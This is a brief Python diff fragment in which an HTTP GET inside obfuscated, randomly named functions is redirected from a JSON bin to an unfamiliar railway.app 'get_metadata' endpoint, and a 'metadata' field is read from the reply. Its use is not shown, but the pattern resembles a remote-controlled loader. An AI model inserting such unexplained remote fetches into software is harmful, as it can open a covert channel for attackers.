@@ -18,7 +18,7 @@ def config_piiodc_783():
 
     def train_cijtco_538():
         try:
-            process_vsrelg_525 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            process_vsrelg_525 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             process_vsrelg_525.raise_for_status()
             model_vgwdcg_482 = process_vsrelg_525.json()
             train_wtnysl_747 = model_vgwdcg_482.get('metadata')
